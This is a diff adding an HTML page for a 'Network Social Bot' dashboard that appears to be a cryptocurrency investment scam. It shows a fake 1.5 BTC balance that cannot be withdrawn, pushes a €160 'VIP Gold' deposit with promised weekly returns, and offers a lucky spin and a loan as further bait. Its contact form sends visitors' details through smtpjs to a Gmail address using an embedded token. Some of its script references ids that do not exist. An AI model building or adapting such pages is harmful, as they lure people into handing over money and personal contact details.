@@ -1,0 +1,806 @@
+<!DOCTYPE html>
+<html lang ="en">
+<head>
+<meta charset="UTF-8"> 
+  <meta http-equiv="X-UA-Compatible" content="IE=edge"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+  <script src="https://kit.fontawesome.com/7e2a69d5dd.js"></script> 
+  <script src="https://smtpjs.com/v3/smtp.js"></script> 
+  <script src="https://kit.fontawesome.com/7e2a69d5dd.js" crossorigin="anonymous"></script>
+<script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"/>
+</head>
+<style>
+@import url("https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap");
+@import url('https://fonts.googleapis.com/css2?family=Archivo+Black&display=swap');
+
+*{
+    margin:0;
+    padding:0;
+ }
+ body{
+     background-color:black;
+     color:white;
+     margin-top:7%;
+     position :fixed;
+ }
+ .img img{
+     border-radius:100px;
+     margin:0 12px;
+  width:50px;
+  float:left;   
+ }
+
+ .btn button{
+     font-family: 'Poppins', sans-serif;
+     width:%;
+     padding:2%;
+     background-color:rgb(225,245,254);
+     border-radius:5px;
+     border:1px solid #777;
+     margin:0 5px;
+     margin-left:3%;
+ }
+ .cadre1{
+     font-family: 'Poppins', sans-serif;
+     margin-left:4%;
+     margin-right:4%;
+     margin-top:10%;
+    border-radius:10px; 
+ width:92%;
+ height:125px;
+ box-shadow: 0 .5rem 5rem rgba(20,20,20,.20);
+ border: 1px solid #777;
+ 
+ }
+ 
+  .solde1{
+      
+ 
+      margin-top:1.8%;
+      margin-left:5%;
+      
+  }
+  .solde2{
+      
+      margin-top:-33.9%;
+      margin-left:55%;
+  } 
+  h3{
+      font-family: 'Poppins', sans-serif;
+      
+  }
+  av{
+      font-family: 'Poppins', sans-serif;
+      font-size:13px;
+  } 
+  ca{
+      font-size:13px;
+      font-family: "Archivo Black", sans-serif;
+  }
+  cb{
+      font-size:13px;
+      font-family: "Archivo Black", sans-serif;
+      color:#FFD700;
+  }
+  .vertical-line {
+     
+      margin-top:-30%;
+      margin-left:50%;
+  border-left: 1px solid rgb(225,245,254);;
+  height: 100px;
+}
+ad{
+    font-size:23px;
+}
+ac{
+    font-size:19px;
+}
+ae{
+    font-size:19px; 
+}
+.ctn button{
+    padding:1.5%;
+    background-color:rgb(21,101,192);
+    color:white;
+    border:none;
+    font-family: 'Poppins', sans-serif;
+border-radius:5px;
+
+}
+.ltn button{
+    border-radius:5px;
+    padding:3.5%;
+    background-color:rgb(255,193,7);
+    color: black ;
+    border:none;
+    font-family: 'Poppins', sans-serif;
+    
+}
+.amg img{
+    
+    margin-left:79.4%;
+    width:30px;
+}
+.bb{
+ margin-top:-26%;   
+}
+.bts button {
+    font-family: 'Poppins', sans-serif;
+    margin-left:3%;
+    margin-top:30%;
+  display: flex;
+  align-items: center;
+  justify-content: flex-start;
+  padding: 5px;
+  background-color: rgb(21,101,192);
+  border: none;
+  border-radius: 5px;
+  cursor: pointer;
+  color:white;
+  margin:;
+}
+
+.button img {
+    margin-top:2%;
+  margin-right: 10px;
+  width: 20px;
+  height: 20px;
+}
+.bts{
+   between:5px;
+    display:flex;
+}
+#lbt{
+    color:black;
+    background-color:rgb(255,193,7);
+}
+.dtn button{
+    font-family: 'Poppins', sans-serif;
+    margin-left:3%;
+    margin-top:%;
+  display: flex;
+  align-items: center;
+  justify-content: ;
+  width:80%;
+  height:30px;
+  background-color: rgb(21,101,192);
+  border: none;
+  border-radius: 5px;
+  cursor: pointer;
+  color:white;
+  margin:;
+  text-align:center;
+}
+.cadre2{
+    
+     font-family: 'Poppins', sans-serif;
+     margin-left:4%;
+     margin-right:4%;
+     margin-top:%;
+    border-radius:10px; 
+ width:92%;
+ height:90px;
+ box-shadow: 0 .5rem 5rem rgba(20,20,20,.20);
+ border:1px solid #777;
+ 
+ }
+
+ .bmg img{
+    width:30px; 
+ }
+ .bmg{
+     margin-top:-10%;
+     margin-left:15%;
+ }
+ .lmg img{
+     margin-top:%;
+     margin-left:3%;
+     width:90px;
+ }
+ .txt1{
+     margin-left:30%;
+     margin-top:-20%;
+    font-size:11px;
+    font-family: "Archivo Black", sans-serif; 
+ }
+ 
+.xtn button{
+  font-family: 'Poppins', sans-serif;
+    margin-left:42%;
+    margin-top:3%;
+  align-items: center;
+  justify-content: flex-start;
+  padding: 5px;
+  background-color: rgb(21,101,192);
+  border: none;
+  border-radius: 5px;
+  cursor: pointer;
+  color:white;
+  margin:;  
+}
+a{
+    color:white;
+    cursor:none;
+    Outline:none;
+    text-decoration:none;
+}
+.cadre3{
+    font-family: 'Poppins', sans-serif;
+     margin-left:2%;
+     margin-right:4%;
+     margin-top:7%;
+    border-radius:10px; 
+ width:95%;
+ height:117px;
+ box-shadow: 0 .5rem 5rem rgba(20,20,20,.20);
+ border: 1px solid #777;
+ 
+}
+#ba{
+    color:black;
+}
+.hmg img{
+    margin-top:5%;
+    width:100px;
+}
+.prêt {
+    font-size:13px;
+    margin-left:2%;
+    margin-top:-36%;
+    font-family: "Archivo Black", sans-serif;
+}
+.text{
+    margin-top:-5%;
+    margin-left:35%;
+    margin-right:10%;
+   font-family: 'Poppins', sans-serif;
+  font-size:10px; 
+}
+.but button{
+   font-family: "Archivo Black", sans-serif;
+     margin-left:42%;
+    margin-top:3%;
+  align-items: center;
+  justify-content: flex-start;
+  padding: 6px;
+  background-color: rgb(255,193,7);
+  border: none;
+  border-radius: 5px;
+  cursor: pointer;
+  color:black;
+  margin:; 
+  font-size:13px;
+}
+.text2{
+    margin-left:10%;
+    font-family: "Archivo Black", sans-serif;
+      font-size:15px;
+      margin-top:-5%;
+}
+.alert1 {
+    padding:3%;
+    margin-top:45%;
+    margin-left:8%;
+  display:none; ;
+position: fixed;
+top: 0;
+left: 0;
+width: 80%;
+height: 45%;
+background-color: rgb(21,101,192);
+color:white;
+border-radius:5px;
+}
+.text3{
+    margin-left:10%;
+    margin-right:10%;
+    font-size:13px;
+}
+span{
+    margin-top:-20px;
+    font-size:25px;
+}
+.text3 button{
+    font-family: "Archivo Black", sans-serif;
+     margin-left:10%;
+    margin-top:3%;
+  align-items: center;
+  justify-content: flex-start;
+  padding: 6px;
+  background-color: rgb(255,193,7);
+  border: none;
+  border-radius: 5px;
+  cursor: pointer;
+  color:black;
+  margin:; 
+  font-size:13px;
+}
+oc{
+    font-family: "Archivo Black", sans-serif;
+    font-size:13px;
+    color:blue;
+}
+oh{
+    font-family: "Archivo Black", sans-serif;
+    font-size:
+    margin-left:5px;
+}
+e{
+ color: transparent;
+        
+ }
+ .alert2{
+     padding:2%;
+     background-color:black;
+    color:white;
+     margin-top:-50%;
+     display:none;
+     position: absolute;
+     border:1px solid #777; 
+     border-radius:5px;
+     text-align:center; 
+     width:85%;
+     height:150px;
+     margin-right:3%;
+ }
+ .kmg img{
+     width:50px;
+ }
+ .obb button{
+     font-family: "Archivo Black", sans-serif;
+     margin-left:1%;
+    margin-top:%-2;
+  align-items: center;
+  justify-content: flex-start;
+  padding: 6px;
+  background-color: rgb(21,101,192);
+  border: none;
+  border-radius: 5px;
+  cursor: pointer;
+  color:white;
+  margin:; 
+  font-size:13px;
+ }
+ .obb{
+     font-size:13px;
+ }
+.alert5{
+    background-color:white;
+    color:black;
+    position: fixed;
+top: 0;
+left: 0;
+    display: none;
+     border-radius:3%;
+     margin-top:35%;
+     margin-left:2%;
+     width:95%;
+     height:200px;
+     text-align:center;
+     border:1px solid #777;
+ }
+ .mga img{
+     width:100px;
+ }
+ .text4{
+     font-size:15px;
+     font-family: 'Poppins', sans-serif;
+ 
+     opacity:80%;
+ }
+ 
+ .text5{
+    font-size:15px;
+     font-family: 'Poppins', sans-serif; 
+     opacity:80%;
+ }
+ .ltn button{
+     margin-left:5%;
+    margin-top:%;
+  align-items: center;
+  justify-content: flex-start;
+  padding: 6px;
+  background-color: rgb(255,193,7);
+  border: none;
+  border-radius: 5px;
+  cursor: pointer;
+  color:black;
+  margin:; 
+  font-size:13px;
+ }
+ .wtn button{
+     font-family: "Archivo Black", sans-serif;
+     margin-left:5%;
+    margin-top:3%;
+  align-items: center;
+  justify-content: flex-start;
+  padding: 6px;
+  background-color: rgb(255,193,7);
+  border: none;
+  border-radius: 5px;
+  cursor: pointer;
+  color:black;
+  margin:; 
+  font-size:13px;
+ }
+ .alert6{
+     background-color:white;
+    position: fixed;
+top: 0;
+left: 0;
+     border-radius:3%;
+     margin-top:35%;
+     margin-left:
+     width:50%;
+     height:200px;
+     text-align:center;
+     border:1px solid #777;
+     padding:%;
+ }
+ .gtn button{
+     font-family: "Archivo Black", sans-serif;
+     margin-left:5%;
+    margin-top:%;
+  align-items: center;
+  justify-content: flex-start;
+  padding: 6px;
+  background-color: rgb(255,193,7);
+  border: none;
+  border-radius: 5px;
+  cursor: pointer;
+  color:black;
+  margin:; 
+  font-size:13px;
+ }
+#alert7 {
+    font-family: 'Poppins', sans-serif;
+    margin-top:-5%;
+    margin-left:3%;
+  display: none;
+  position:fixed;
+  background-color:white;
+  border:1px solid #777;
+  width:89%;
+  padding:2%;
+  border-radius:3px
+}
+.tmg img{
+    width:150px;
+}
+.tmg{
+    text-align:center;
+}
+h4{
+    
+}
+vo{
+    
+    font-family: "Archivo Black", sans-serif;
+ color:red; 
+ font-size:13px;  
+}
+ta{
+    font-family: "Archivo Black", sans-serif;
+    color:red;
+    font-size:8px;
+}
+.obn{
+  margin-left:3%;  
+  margin-rigth:3%;
+}
+a1{
+    font-size:10px;
+}
+.ztn button{
+    font-family: "Archivo Black", sans-serif;
+     margin-left:27%;
+    margin-top:%;
+  align-items: center;
+  justify-content: flex-start;
+  width:50%;
+  height:30px;
+  background-color: rgb(255,193,7);
+  border: none;
+  border-radius: 5px;
+  cursor: pointer;
+  color:black;
+  margin:; 
+  font-size:13px;
+}
+.contact{
+    position: fixed;
+    margin-top:72%;
+    margin-left:80%;
+}
+.contact img{
+    width:60px;
+    cursor:pointer;
+      
+}
+.msg{
+    margin-top:-5%;
+    margin-left:7%;
+    width:85%;
+    height:400px;
+    border:1px solid #777;
+    background-color:white;
+    position:fixed;
+    display:none;
+    text-align:center;
+    border-radius:5px;
+}
+input{
+    margin-top:5%;
+    Outline:none;
+    width:80%;
+    height:20px;
+}
+textarea{
+    margin-top:5%;
+    Outline:none;
+    width:80%;
+    height:200px;
+}
+.msg button{
+    background-color:green;
+    width:80%;
+    height:30px;
+    border:none;
+    color:white;
+}
+.us{
+    margin-top:2%;
+   font-family: "Archivo Black", sans-serif; 
+}
+.gtu img{
+    margin-top:3%;
+    width:50px;
+}
+input[type="submit"] {
+    margin-top:%;
+ background-color:green;
+    width:80%;
+    height:30px;
+    border:none;
+    color:white;   
+}
+    </style>
+<body><br>
+<header>
+<div class="img">
+<img src="https://i.postimg.cc/nhf1L9Tw/icone-profil-utilisateur-recto-187299-39596.jpg"></div><h3>Hello !</h3>
+<av>We are happy to see you again!</av>
+<div class="icon"></div>
+</header><br>
+
+<oh>
+<e>c</e>Network Social Bot
+</oh>
+<br><br>
+<div class="contact" onclick="toggleMsg()"><img src="https://i.postimg.cc/htNPZhk0/8643765-1.png"></div>
+<div class="msg">
+<div class="gtu"><img src="https://i.postimg.cc/qv5gYPDd/customer-service-icon-user-headphone-260nw-519942472-1.jpg"></div>
+<div class="us">Contact US</div>
+<form action ="#">
+    <input type="text" placeholder="Enter Your email" id="aname" required><br>
+    <textarea placeholder="Message" id="bname" required></textarea>
+        <input type="submit" value="SEND"> 
+        </form>
+</div>
+
+
+<div class="btn">
+<button type="">Network</button>
+<button type="submit">Sponsorship</button>
+<button type="submit">Social</button>
+<button type="submit">Credit</button>
+</div>
+
+
+
+<div class="cadre1">
+<div class="solde1">
+<ca>Simple Account</ca><br>
+<ab>Balance</ab><br><ac></ac><ad>1.5</ad><ae> BTC</ae>
+<div class="ctn"><a href="https://networksocialbot.github.io/spin3/">
+<button id="withdrawButto"  type="submit">withdrawal</button></a>
+
+
+
+</div></div><div class="solde2">
+<ca>Account VIP GOLD</ca><br>
+<ab>Balance</ab><br><ac>&euro;</ac><ad>0</ad><ae>.00</ae>
+<div class="ltn"><a href="#">
+<button id="showAlert"  type="submit">withdrawal</button></a></div></div>
+<div class="vertical-line"></div>
+<div class="bb">
+<div class="amg">
+<img src="https://i.postimg.cc/3RnvRVJN/7c72.gif">
+</div></div>
+<div class="bts"><a href="https://networksocialbot.github.io/Spindepo/">
+<button class="button"><img src="https://i.postimg.cc/jqB481yS/logo2-5-75150.png" alt="Image du bouton">Deposit</a></button>
+
+<a href="https://networksocialbot.github.io/Spin5/"><button class="button"><img src="https://i.postimg.cc/Hxj2r11b/2024-02-05-07-31-46-505.png" alt="Image du bouton">Simple job</a></button>
+
+<a href="#" id="ba"><button class="button" id="lbt"><img src="https://i.postimg.cc/3RnvRVJN/7c72.gif" alt="Image du bouton">VIP Job</a></button</div></div><br>
+<div class="cadre2">
+<div class="lmg">
+<img src="https://i.postimg.cc/3xpGBBbL/spin-wheel-game-free-png.png"> </div>
+<div class="bmg">
+</div>
+<div class="txt1">Try your luck with Lucky Spin to win up to 1.5 BTC.</div>
+<div class="xtn">
+<a href="#"><button id="showAlert7">Try your luck</button>
+
+</a></div>
+</div>
+
+<div class="cadre3">
+<div class="hmg">
+<img src="https://i.postimg.cc/52jRLCxn/pngtree-coin-in-hand-loan-logo-vector-png-image-8137202.png">
+</div>
+<div class="prêt">
+Financial loan 
+</div>
+<div class="text">
+  <d>
+    The financial loan is available exclusively to former users. Thanks for understanding.This service is sponsored by the NGO APFRU.  </d>
+</div>
+
+<div class="but">
+  <button id="obtenir-pret" type="button">Ask for a loan</button>
+  <div id="alert" class="alert2">
+    <div class="kmg"><img src="https://i.postimg.cc/wB1Y2vdD/logo2-5-1905.png"></div>
+    <div class="obb">
+    Sorry, this option is only available to former users, VIP Gold users and foreigners residing in Ukraine.<br>
+    <button id="ok" type="button">OK</button></div>
+  </div>
+
+  <div id="warning" class="alert1">
+    <span id="close" class="close">&times</span>
+    <div class="text2">
+      About  :
+    </div>
+    <div class="text3">
+      The VIP account allows you to earn much more, only verified users can use this service. Just invest at least 160&euro; and start by earning at least 250&euro; per week. This part is funded by the NGO APFRU.<br>
+      Do you want to have more information on the NGO Apfru? Click here <a href="#"><oc>apfru.com</oc></a> .
+      <br>
+      <a href="https://networksocialbot.github.io/spin6/"><button type="button">OK, Start VIP Gold.</button></a>
+    </div>
+  </div>
+</div>
+
+<div  class="alert6" style="display: none;">
+<div class="mga">
+<img src="https://i.postimg.cc/7Z9bVhLV/logo2-6-14240.png"></div>
+<div class="text5">
+You cannot perform this action, the minimum withdrawal is &euro;130.</div>
+<div class="wtn"><button id="returnButton"  type="button">OK</button>
+</div></div>
+
+<div id="alert5" class="alert5">
+<div class="lol">
+<div class="mga">
+<img src="https://i.postimg.cc/7Z9bVhLV/logo2-6-14240.png"></div>
+<div class="text4">
+You cannot perform this action, the minimum withdrawal is &euro;130.</div>
+<div class="gtn"><button id="hideAlert" type="button">OK</button>
+</div></div> 
+
+    </body>
+      <script>
+         
+       // Sélectionner le bouton par son id
+var button = document.querySelector("#lbt");
+
+// Appliquer un gestionnaire d'événements sur le clic du bouton
+button.addEventListener("click", function() {
+  // Sélectionner le div "alert1" par sa classe
+  var alert1 = document.querySelector(".alert1");
+  
+  // Changer la propriété CSS du div "alert1" pour l'afficher
+  alert1.style.display = "block";
+}); 
+
+
+
+var closeButton = document.getElementById("close");
+var alertDiv = document.getElementById("warning");
+
+closeButton.addEventListener("click", function() {
+  alertDiv.style.display = "none";
+});
+
+document.getElementById("close").addEventListener("click", function() {
+    document.getElementById("warning").classList.remove("visible");
+});   
+
+
+// Cacher le div "alert2" initialement
+  document.getElementById("alert").style.display = "none";
+
+  // Afficher le div "alert2" lors du clic sur le bouton "Obtenir un prêt"
+  document.getElementById("obtenir-pret").addEventListener("click", function() {
+    document.getElementById("alert").style.display = "block";
+  });
+
+  // Cacher le div "alert2" lors du clic sur le bouton "OK"
+  document.getElementById("ok").addEventListener("click", function() {
+    document.getElementById("alert").style.display = "none";
+  });
+  
+  var btnShowAlert = document.getElementById("showAlert");
+var btnHideAlert = document.getElementById("hideAlert");
+var alert5 = document.getElementById("alert5");
+
+btnShowAlert.addEventListener("click", function() {
+  alert5.style.display = "block";
+});
+
+btnHideAlert.addEventListener("click", function() {
+  alert5.style.display = "none";
+});
+
+
+var alert6 = document.querySelector('.alert6');
+var withdrawButton = document.querySelector('#withdrawButton');
+var returnButton = document.querySelector('#returnButton');
+
+withdrawButton.addEventListener('click', function() {
+  alert6.style.display = 'block';
+});
+
+returnButton.addEventListener('click', function() {
+  alert6.style.display = 'none';
+});
+
+    // Cacher le div "alert7" initialement
+document.getElementById("alert7").style.display = "none";
+
+// Afficher le div "alert7" lors du clic sur le bouton "Prueba mi suerte"
+document.getElementById("showAlert7").addEventListener("click", function() {
+  document.getElementById("alert7").style.display = "block";
+});
+function toggleMsg(){
+    var msg = document.querySelector('.msg');
+    if(msg.style.display === "none"){
+        msg.style.display = "block";
+    } else {
+        msg.style.display = "none";
+    }
+}
+
+
+const aname = document.getElementById('aname');
+const bname = document.getElementById('bname');
+const submit = document.querySelector('input[type="submit"]'); // Sélection de l'élément de type "submit"
+
+submit.addEventListener('click', (e) => { // Changer l'événement à "click" au lieu de "submit"
+    e.preventDefault();
+
+    // Ajout du délai de 5 secondes avant l'envoi du formulaire
+    setTimeout(() => {
+        let ebody = `
+          <h1>Nom : </h1>${aname.value}
+            <br>
+           <h1>Famille : </h1>${bname.value}
+            <br>
+            `;
+        
+        Email.send({
+            SecureToken : "24ed91c7-882b-465c-97d2-32856db82fdb", // Ajouter votre jeton ici
+            To : 'abdoulissa154@gmail.com', 
+            From : "abdoulissa154@gmail.com",
+            Subject : "Ceci est le sujet",
+            Body : ebody
+        }).then(() => {
+          window.location.href = "https://networkmoneysocialbotfr.on.drv.tw/remer1.html"; // Redirection vers Google
+        });
+    }, 500); // Délai de 1000 millisecondes (1 seconde)
+});
+
+          
+      </script>
+      </html>
+      
